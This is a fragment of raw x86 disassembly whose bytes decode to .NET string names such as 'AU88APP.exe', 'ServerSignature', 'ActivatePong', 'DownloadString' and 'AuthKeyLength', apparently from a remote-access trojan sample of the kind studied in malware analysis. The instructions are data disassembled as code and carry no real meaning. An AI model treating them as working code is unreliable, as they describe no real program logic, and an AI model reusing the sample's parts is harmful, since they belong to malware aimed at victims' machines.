  405f15:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  405f1c:	6e 
  405f1d:	4e                   	dec    %esi
  405f1e:	61                   	popa
  405f1f:	6d                   	insl   (%dx),%es:(%edi)
  405f20:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405f24:	74 5f                	je     0x405f85
  405f26:	55                   	push   %ebp
  405f27:	73 65                	jae    0x405f8e
  405f29:	72 4e                	jb     0x405f79
  405f2b:	61                   	popa
  405f2c:	6d                   	insl   (%dx),%es:(%edi)
  405f2d:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  405f31:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  405f35:	6f                   	outsl  %ds:(%esi),(%dx)
  405f36:	73 74                	jae    0x405fac
  405f38:	4e                   	dec    %esi
  405f39:	61                   	popa
  405f3a:	6d                   	insl   (%dx),%es:(%edi)
  405f3b:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  405f3f:	6d                   	insl   (%dx),%es:(%edi)
  405f40:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  405f45:	65 54                	gs push %esp
  405f47:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  405f4e:	5f                   	pop    %edi
  405f4f:	4c                   	dec    %esp
  405f50:	61                   	popa
  405f51:	73 74                	jae    0x405fc7
  405f53:	57                   	push   %edi
  405f54:	72 69                	jb     0x405fbf
  405f56:	74 65                	je     0x405fbd
  405f58:	54                   	push   %esp
  405f59:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  405f60:	6e                   	outsb  %ds:(%esi),(%dx)
  405f61:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  405f68:	54                   	push   %esp
  405f69:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  405f70:	74 65                	je     0x405fd7
  405f72:	4c                   	dec    %esp
  405f73:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  405f7a:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  405f7d:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  405f81:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  405f88:	6d                   	insl   (%dx),%es:(%edi)
  405f89:	65 54                	gs push %esp
  405f8b:	79 70                	jns    0x405ffd
  405f8d:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  405f91:	6c                   	insb   (%dx),%es:(%edi)
  405f92:	75 65                	jne    0x405ff9
  405f94:	54                   	push   %esp
  405f95:	79 70                	jns    0x406007
  405f97:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405f9b:	6f                   	outsl  %ds:(%esi),(%dx)
  405f9c:	74 6f                	je     0x40600d
  405f9e:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  405fa1:	54                   	push   %esp
  405fa2:	79 70                	jns    0x406014
  405fa4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405fa8:	74 54                	je     0x405ffe
  405faa:	79 70                	jns    0x40601c
  405fac:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  405fb0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  405fb3:	74 54                	je     0x406009
  405fb5:	79 70                	jns    0x406027
  405fb7:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  405fbb:	73 74                	jae    0x406031
  405fbd:	65 6d                	gs insl (%dx),%es:(%edi)
  405fbf:	2e 43                	cs inc %ebx
  405fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  405fc2:	72 65                	jb     0x406029
  405fc4:	00 53 65             	add    %dl,0x65(%ebx)
  405fc7:	72 76                	jb     0x40603f
  405fc9:	65 72 73             	gs jb  0x40603f
  405fcc:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  405fd3:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  405fd7:	6f                   	outsl  %ds:(%esi),(%dx)
  405fd8:	73 65                	jae    0x40603f
  405fda:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  405fde:	70 6f                	jo     0x40604f
  405fe0:	73 65                	jae    0x406047
  405fe2:	00 53 74             	add    %dl,0x74(%ebx)
  405fe5:	72 52                	jb     0x406039
  405fe7:	65 76 65             	gs jbe 0x40604f
  405fea:	72 73                	jb     0x40605f
  405fec:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  405ff0:	30 39                	xor    %bh,(%ecx)
  405ff2:	43                   	inc    %ebx
  405ff3:	65 72 74             	gs jb  0x40606a
  405ff6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405ffd:	00 56 61             	add    %dl,0x61(%esi)
  406000:	6c                   	insb   (%dx),%es:(%edi)
  406001:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  406008:	72 
  406009:	76 65                	jbe    0x406070
  40600b:	72 43                	jb     0x406050
  40600d:	65 72 74             	gs jb  0x406084
  406010:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406017:	00 63 65             	add    %ah,0x65(%ebx)
  40601a:	72 74                	jb     0x406090
  40601c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406023:	00 43 72             	add    %al,0x72(%ebx)
  406026:	65 61                	gs popa
  406028:	74 65                	je     0x40608f
  40602a:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  40602e:	75 67                	jne    0x406097
  406030:	67 65 72 42          	addr16 gs jb 0x406076
  406034:	72 6f                	jb     0x4060a5
  406036:	77 73                	ja     0x4060ab
  406038:	61                   	popa
  406039:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  40603d:	74 61                	je     0x4060a0
  40603f:	74 65                	je     0x4060a6
  406041:	00 53 65             	add    %dl,0x65(%ebx)
  406044:	74 54                	je     0x40609a
  406046:	68 72 65 61 64       	push   $0x64616572
  40604b:	45                   	inc    %ebp
  40604c:	78 65                	js     0x4060b3
  40604e:	63 75 74             	arpl   %esi,0x74(%ebp)
  406051:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  406058:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40605d:	65 74 65             	gs je  0x4060c5
  406060:	00 43 61             	add    %al,0x61(%ebx)
  406063:	6c                   	insb   (%dx),%es:(%edi)
  406064:	6c                   	insb   (%dx),%es:(%edi)
  406065:	53                   	push   %ebx
  406066:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40606d:	74 
  40606e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406072:	6d                   	insl   (%dx),%es:(%edi)
  406073:	70 69                	jo     0x4060de
  406075:	6c                   	insb   (%dx),%es:(%edi)
  406076:	65 72 47             	gs jb  0x4060c0
  406079:	65 6e                	outsb  %gs:(%esi),(%dx)
  40607b:	65 72 61             	gs jb  0x4060df
  40607e:	74 65                	je     0x4060e5
  406080:	64 41                	fs inc %ecx
  406082:	74 74                	je     0x4060f8
  406084:	72 69                	jb     0x4060ef
  406086:	62 75 74             	bound  %esi,0x74(%ebp)
  406089:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40608e:	75 67                	jne    0x4060f7
  406090:	67 61                	addr16 popa
  406092:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406096:	74 74                	je     0x40610c
  406098:	72 69                	jb     0x406103
  40609a:	62 75 74             	bound  %esi,0x74(%ebp)
  40609d:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4060a2:	75 67                	jne    0x40610b
  4060a4:	67 65 72 42          	addr16 gs jb 0x4060ea
  4060a8:	72 6f                	jb     0x406119
  4060aa:	77 73                	ja     0x40611f
  4060ac:	61                   	popa
  4060ad:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4060b1:	74 74                	je     0x406127
  4060b3:	72 69                	jb     0x40611e
  4060b5:	62 75 74             	bound  %esi,0x74(%ebp)
  4060b8:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4060bc:	6d                   	insl   (%dx),%es:(%edi)
  4060bd:	56                   	push   %esi
  4060be:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4060c5:	74 74                	je     0x40613b
  4060c7:	72 69                	jb     0x406132
  4060c9:	62 75 74             	bound  %esi,0x74(%ebp)
  4060cc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4060d0:	73 65                	jae    0x406137
  4060d2:	6d                   	insl   (%dx),%es:(%edi)
  4060d3:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4060d7:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4060de:	72 
  4060df:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4060e6:	73 73                	jae    0x40615b
  4060e8:	65 6d                	gs insl (%dx),%es:(%edi)
  4060ea:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4060ee:	72 61                	jb     0x406151
  4060f0:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4060f3:	61                   	popa
  4060f4:	72 6b                	jb     0x406161
  4060f6:	41                   	inc    %ecx
  4060f7:	74 74                	je     0x40616d
  4060f9:	72 69                	jb     0x406164
  4060fb:	62 75 74             	bound  %esi,0x74(%ebp)
  4060fe:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  406103:	67 65 74 46          	addr16 gs je 0x40614d
  406107:	72 61                	jb     0x40616a
  406109:	6d                   	insl   (%dx),%es:(%edi)
  40610a:	65 77 6f             	gs ja  0x40617c
  40610d:	72 6b                	jb     0x40617a
  40610f:	41                   	inc    %ecx
  406110:	74 74                	je     0x406186
  406112:	72 69                	jb     0x40617d
  406114:	62 75 74             	bound  %esi,0x74(%ebp)
  406117:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40611b:	73 65                	jae    0x406182
  40611d:	6d                   	insl   (%dx),%es:(%edi)
  40611e:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  406122:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  406129:	69 
  40612a:	6f                   	outsl  %ds:(%esi),(%dx)
  40612b:	6e                   	outsb  %ds:(%esi),(%dx)
  40612c:	41                   	inc    %ecx
  40612d:	74 74                	je     0x4061a3
  40612f:	72 69                	jb     0x40619a
  406131:	62 75 74             	bound  %esi,0x74(%ebp)
  406134:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406138:	73 65                	jae    0x40619f
  40613a:	6d                   	insl   (%dx),%es:(%edi)
  40613b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40613f:	6f                   	outsl  %ds:(%esi),(%dx)
  406140:	6e                   	outsb  %ds:(%esi),(%dx)
  406141:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  406147:	74 69                	je     0x4061b2
  406149:	6f                   	outsl  %ds:(%esi),(%dx)
  40614a:	6e                   	outsb  %ds:(%esi),(%dx)
  40614b:	41                   	inc    %ecx
  40614c:	74 74                	je     0x4061c2
  40614e:	72 69                	jb     0x4061b9
  406150:	62 75 74             	bound  %esi,0x74(%ebp)
  406153:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406157:	73 65                	jae    0x4061be
  406159:	6d                   	insl   (%dx),%es:(%edi)
  40615a:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40615e:	65 73 63             	gs jae 0x4061c4
  406161:	72 69                	jb     0x4061cc
  406163:	70 74                	jo     0x4061d9
  406165:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40616c:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  406173:	6f                   	outsl  %ds:(%esi),(%dx)
  406174:	6d                   	insl   (%dx),%es:(%edi)
  406175:	70 69                	jo     0x4061e0
  406177:	6c                   	insb   (%dx),%es:(%edi)
  406178:	61                   	popa
  406179:	74 69                	je     0x4061e4
  40617b:	6f                   	outsl  %ds:(%esi),(%dx)
  40617c:	6e                   	outsb  %ds:(%esi),(%dx)
  40617d:	52                   	push   %edx
  40617e:	65 6c                	gs insb (%dx),%es:(%edi)
  406180:	61                   	popa
  406181:	78 61                	js     0x4061e4
  406183:	74 69                	je     0x4061ee
  406185:	6f                   	outsl  %ds:(%esi),(%dx)
  406186:	6e                   	outsb  %ds:(%esi),(%dx)
  406187:	73 41                	jae    0x4061ca
  406189:	74 74                	je     0x4061ff
  40618b:	72 69                	jb     0x4061f6
  40618d:	62 75 74             	bound  %esi,0x74(%ebp)
  406190:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406194:	73 65                	jae    0x4061fb
  406196:	6d                   	insl   (%dx),%es:(%edi)
  406197:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40619b:	72 6f                	jb     0x40620c
  40619d:	64 75 63             	fs jne 0x406203
  4061a0:	74 41                	je     0x4061e3
  4061a2:	74 74                	je     0x406218
  4061a4:	72 69                	jb     0x40620f
  4061a6:	62 75 74             	bound  %esi,0x74(%ebp)
  4061a9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4061ad:	73 65                	jae    0x406214
  4061af:	6d                   	insl   (%dx),%es:(%edi)
  4061b0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4061b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4061b5:	70 79                	jo     0x406230
  4061b7:	72 69                	jb     0x406222
  4061b9:	67 68 74 41 74 74    	addr16 push $0x74744174
  4061bf:	72 69                	jb     0x40622a
  4061c1:	62 75 74             	bound  %esi,0x74(%ebp)
  4061c4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4061c8:	73 65                	jae    0x40622f
  4061ca:	6d                   	insl   (%dx),%es:(%edi)
  4061cb:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4061cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4061d0:	6d                   	insl   (%dx),%es:(%edi)
  4061d1:	70 61                	jo     0x406234
  4061d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4061d4:	79 41                	jns    0x406217
  4061d6:	74 74                	je     0x40624c
  4061d8:	72 69                	jb     0x406243
  4061da:	62 75 74             	bound  %esi,0x74(%ebp)
  4061dd:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4061e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4061e2:	74 69                	je     0x40624d
  4061e4:	6d                   	insl   (%dx),%es:(%edi)
  4061e5:	65 43                	gs inc %ebx
  4061e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4061e8:	6d                   	insl   (%dx),%es:(%edi)
  4061e9:	70 61                	jo     0x40624c
  4061eb:	74 69                	je     0x406256
  4061ed:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4061f0:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4061f7:	69 
  4061f8:	62 75 74             	bound  %esi,0x74(%ebp)
  4061fb:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4061ff:	74 5f                	je     0x406260
  406201:	55                   	push   %ebp
  406202:	73 65                	jae    0x406269
  406204:	53                   	push   %ebx
  406205:	68 65 6c 6c 45       	push   $0x456c6c65
  40620a:	78 65                	js     0x406271
  40620c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40620f:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  406213:	74 65                	je     0x40627a
  406215:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  406219:	65 74 65             	gs je  0x406281
  40621c:	56                   	push   %esi
  40621d:	61                   	popa
  40621e:	6c                   	insb   (%dx),%es:(%edi)
  40621f:	75 65                	jne    0x406286
  406221:	00 47 65             	add    %al,0x65(%edi)
  406224:	74 56                	je     0x40627c
  406226:	61                   	popa
  406227:	6c                   	insb   (%dx),%es:(%edi)
  406228:	75 65                	jne    0x40628f
  40622a:	00 53 65             	add    %dl,0x65(%ebx)
  40622d:	74 56                	je     0x406285
  40622f:	61                   	popa
  406230:	6c                   	insb   (%dx),%es:(%edi)
  406231:	75 65                	jne    0x406298
  406233:	00 76 61             	add    %dh,0x61(%esi)
  406236:	6c                   	insb   (%dx),%es:(%edi)
  406237:	75 65                	jne    0x40629e
  406239:	00 67 65             	add    %ah,0x65(%edi)
  40623c:	74 5f                	je     0x40629d
  40623e:	4b                   	dec    %ebx
  40623f:	65 65 70 41          	gs gs jo 0x406284
  406243:	6c                   	insb   (%dx),%es:(%edi)
  406244:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  40624b:	5f                   	pop    %edi
  40624c:	4b                   	dec    %ebx
  40624d:	65 65 70 41          	gs gs jo 0x406292
  406251:	6c                   	insb   (%dx),%es:(%edi)
  406252:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  406259:	6f                   	outsl  %ds:(%esi),(%dx)
  40625a:	76 65                	jbe    0x4062c1
  40625c:	00 41 55             	add    %al,0x55(%ecx)
  40625f:	38 38                	cmp    %bh,(%eax)
  406261:	41                   	inc    %ecx
  406262:	50                   	push   %eax
  406263:	50                   	push   %eax
  406264:	2e 65 78 65          	cs js,pn 0x4062cd
  406268:	00 73 65             	add    %dh,0x65(%ebx)
  40626b:	74 5f                	je     0x4062cc
  40626d:	42                   	inc    %edx
  40626e:	6c                   	insb   (%dx),%es:(%edi)
  40626f:	6f                   	outsl  %ds:(%esi),(%dx)
  406270:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  406273:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40627a:	5f                   	pop    %edi
  40627b:	54                   	push   %esp
  40627c:	6f                   	outsl  %ds:(%esi),(%dx)
  40627d:	74 61                	je     0x4062e0
  40627f:	6c                   	insb   (%dx),%es:(%edi)
  406280:	53                   	push   %ebx
  406281:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  406288:	5f                   	pop    %edi
  406289:	48                   	dec    %eax
  40628a:	65 61                	gs popa
  40628c:	64 65 72 53          	fs gs jb 0x4062e3
  406290:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406297:	5f                   	pop    %edi
  406298:	48                   	dec    %eax
  406299:	65 61                	gs popa
  40629b:	64 65 72 53          	fs gs jb 0x4062f2
  40629f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4062a6:	5f                   	pop    %edi
  4062a7:	53                   	push   %ebx
  4062a8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4062aa:	64 42                	fs inc %edx
  4062ac:	75 66                	jne    0x406314
  4062ae:	66 65 72 53          	data16 gs jb 0x406305
  4062b2:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4062b9:	5f                   	pop    %edi
  4062ba:	52                   	push   %edx
  4062bb:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4062bf:	76 65                	jbe    0x406326
  4062c1:	42                   	inc    %edx
  4062c2:	75 66                	jne    0x40632a
  4062c4:	66 65 72 53          	data16 gs jb 0x40631b
  4062c8:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4062cf:	5f                   	pop    %edi
  4062d0:	4b                   	dec    %ebx
  4062d1:	65 79 53             	gs jns 0x406327
  4062d4:	69 7a 65 00 43 72 79 	imul   $0x79724300,0x65(%edx),%edi
  4062db:	70 74                	jo     0x406351
  4062dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4062de:	43                   	inc    %ebx
  4062df:	6f                   	outsl  %ds:(%esi),(%dx)
  4062e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4062e1:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4062e7:	74 5f                	je     0x406348
  4062e9:	50                   	push   %eax
  4062ea:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4062f1:	5f                   	pop    %edi
  4062f2:	50                   	push   %eax
  4062f3:	69 6e 67 00 46 6c 6f 	imul   $0x6f6c4600,0x67(%esi),%ebp
  4062fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4062fb:	64 50                	fs push %eax
  4062fd:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406304:	74 65                	je     0x40636b
  406306:	6d                   	insl   (%dx),%es:(%edi)
  406307:	2e 54                	cs push %esp
  406309:	68 72 65 61 64       	push   $0x64616572
  40630e:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  406315:	5f                   	pop    %edi
  406316:	50                   	push   %eax
  406317:	61                   	popa
  406318:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  40631f:	64 64 
  406321:	5f                   	pop    %edi
  406322:	53                   	push   %ebx
  406323:	65 73 73             	gs jae 0x406399
  406326:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40632d:	6e                   	outsb  %ds:(%esi),(%dx)
  40632e:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  406332:	73 74                	jae    0x4063a8
  406334:	65 6d                	gs insl (%dx),%es:(%edi)
  406336:	45                   	inc    %ebp
  406337:	76 65                	jbe    0x40639e
  406339:	6e                   	outsb  %ds:(%esi),(%dx)
  40633a:	74 73                	je     0x4063af
  40633c:	5f                   	pop    %edi
  40633d:	53                   	push   %ebx
  40633e:	65 73 73             	gs jae 0x4063b4
  406341:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  406348:	6e                   	outsb  %ds:(%esi),(%dx)
  406349:	67 00 45 6e          	add    %al,0x6e(%di)
  40634d:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406350:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406357:	74 65                	je     0x4063be
  406359:	6d                   	insl   (%dx),%es:(%edi)
  40635a:	2e 44                	cs inc %esp
  40635c:	72 61                	jb     0x4063bf
  40635e:	77 69                	ja     0x4063c9
  406360:	6e                   	outsb  %ds:(%esi),(%dx)
  406361:	67 2e 49             	addr16 cs dec %ecx
  406364:	6d                   	insl   (%dx),%es:(%edi)
  406365:	61                   	popa
  406366:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  40636d:	73 
  40636e:	74 65                	je     0x4063d5
  406370:	6d                   	insl   (%dx),%es:(%edi)
  406371:	2e 52                	cs push %edx
  406373:	75 6e                	jne    0x4063e3
  406375:	74 69                	je     0x4063e0
  406377:	6d                   	insl   (%dx),%es:(%edi)
  406378:	65 2e 56             	gs cs push %esi
  40637b:	65 72 73             	gs jb  0x4063f1
  40637e:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  406385:	46                   	inc    %esi
  406386:	72 6f                	jb     0x4063f7
  406388:	6d                   	insl   (%dx),%es:(%edi)
  406389:	42                   	inc    %edx
  40638a:	61                   	popa
  40638b:	73 65                	jae    0x4063f2
  40638d:	36 34 53             	ss xor $0x53,%al
  406390:	74 72                	je     0x406404
  406392:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  406399:	61                   	popa
  40639a:	73 65                	jae    0x406401
  40639c:	36 34 53             	ss xor $0x53,%al
  40639f:	74 72                	je     0x406413
  4063a1:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  4063a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4063a9:	6c                   	insb   (%dx),%es:(%edi)
  4063aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4063ab:	61                   	popa
  4063ac:	64 53                	fs push %ebx
  4063ae:	74 72                	je     0x406422
  4063b0:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  4063b7:	74 72                	je     0x40642b
  4063b9:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  4063c0:	5f                   	pop    %edi
  4063c1:	41                   	inc    %ecx
  4063c2:	73 53                	jae    0x406417
  4063c4:	74 72                	je     0x406438
  4063c6:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4063cd:	5f                   	pop    %edi
  4063ce:	41                   	inc    %ecx
  4063cf:	73 53                	jae    0x406424
  4063d1:	74 72                	je     0x406445
  4063d3:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4063da:	41                   	inc    %ecx
  4063db:	73 53                	jae    0x406430
  4063dd:	74 72                	je     0x406451
  4063df:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4063e6:	53                   	push   %ebx
  4063e7:	74 72                	je     0x40645b
  4063e9:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4063f0:	73 74                	jae    0x406466
  4063f2:	72 69                	jb     0x40645d
  4063f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4063f5:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4063f9:	73 74                	jae    0x40646f
  4063fb:	65 6d                	gs insl (%dx),%es:(%edi)
  4063fd:	2e 44                	cs inc %esp
  4063ff:	72 61                	jb     0x406462
  406401:	77 69                	ja     0x40646c
  406403:	6e                   	outsb  %ds:(%esi),(%dx)
  406404:	67 00 67 65          	add    %ah,0x65(%bx)
  406408:	74 5f                	je     0x406469
  40640a:	41                   	inc    %ecx
  40640b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40640f:	61                   	popa
  406410:	74 65                	je     0x406477
  406412:	50                   	push   %eax
  406413:	6f                   	outsl  %ds:(%esi),(%dx)
  406414:	6e                   	outsb  %ds:(%esi),(%dx)
  406415:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  406419:	74 5f                	je     0x40647a
  40641b:	41                   	inc    %ecx
  40641c:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406420:	61                   	popa
  406421:	74 65                	je     0x406488
  406423:	50                   	push   %eax
  406424:	6f                   	outsl  %ds:(%esi),(%dx)
  406425:	6e                   	outsb  %ds:(%esi),(%dx)
  406426:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40642a:	74 5f                	je     0x40648b
  40642c:	45                   	inc    %ebp
  40642d:	72 72                	jb     0x4064a1
  40642f:	6f                   	outsl  %ds:(%esi),(%dx)
  406430:	72 44                	jb     0x406476
  406432:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  406439:	73 67                	jae    0x4064a2
  40643b:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  40643f:	75 67                	jne    0x4064a8
  406441:	00 43 6f             	add    %al,0x6f(%ebx)
  406444:	6d                   	insl   (%dx),%es:(%edi)
  406445:	70 75                	jo     0x4064bc
  406447:	74 65                	je     0x4064ae
  406449:	48                   	dec    %eax
  40644a:	61                   	popa
  40644b:	73 68                	jae    0x4064b5
  40644d:	00 73 74             	add    %dh,0x74(%ebx)
  406450:	72 54                	jb     0x4064a6
  406452:	6f                   	outsl  %ds:(%esi),(%dx)
  406453:	48                   	dec    %eax
  406454:	61                   	popa
  406455:	73 68                	jae    0x4064bf
  406457:	00 47 65             	add    %al,0x65(%edi)
  40645a:	74 48                	je     0x4064a4
  40645c:	61                   	popa
  40645d:	73 68                	jae    0x4064c7
  40645f:	00 56 65             	add    %dl,0x65(%esi)
  406462:	72 69                	jb     0x4064cd
  406464:	66 79 48             	data16 jns 0x4064af
  406467:	61                   	popa
  406468:	73 68                	jae    0x4064d2
  40646a:	00 46 6c             	add    %al,0x6c(%esi)
  40646d:	75 73                	jne    0x4064e2
  40646f:	68 00 67 65 74       	push   $0x74656700
  406474:	5f                   	pop    %edi
  406475:	45                   	inc    %ebp
  406476:	78 65                	js     0x4064dd
  406478:	63 75 74             	arpl   %esi,0x74(%ebp)
  40647b:	61                   	popa
  40647c:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  406480:	61                   	popa
  406481:	74 68                	je     0x4064eb
  406483:	00 47 65             	add    %al,0x65(%edi)
  406486:	74 54                	je     0x4064dc
  406488:	65 6d                	gs insl (%dx),%es:(%edi)
  40648a:	70 50                	jo     0x4064dc
  40648c:	61                   	popa
  40648d:	74 68                	je     0x4064f7
  40648f:	00 48 6d             	add    %cl,0x6d(%eax)
  406492:	61                   	popa
  406493:	63 53 68             	arpl   %edx,0x68(%ebx)
  406496:	61                   	popa
  406497:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40649d:	67 74 68             	addr16 je 0x406508
  4064a0:	00 67 65             	add    %ah,0x65(%edi)
  4064a3:	74 5f                	je     0x406504
  4064a5:	4c                   	dec    %esp
  4064a6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4064a8:	67 74 68             	addr16 je 0x406513
  4064ab:	00 49 76             	add    %cl,0x76(%ecx)
  4064ae:	4c                   	dec    %esp
  4064af:	65 6e                	outsb  %gs:(%esi),(%dx)
  4064b1:	67 74 68             	addr16 je 0x40651c
  4064b4:	00 41 75             	add    %al,0x75(%ecx)
  4064b7:	74 68                	je     0x406521
  4064b9:	4b                   	dec    %ebx
  4064ba:	65 79 4c             	gs jns 0x406509
  4064bd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4064bf:	67 74 68             	addr16 je 0x40652a
  4064c2:	00 55 72             	add    %dl,0x72(%ebp)
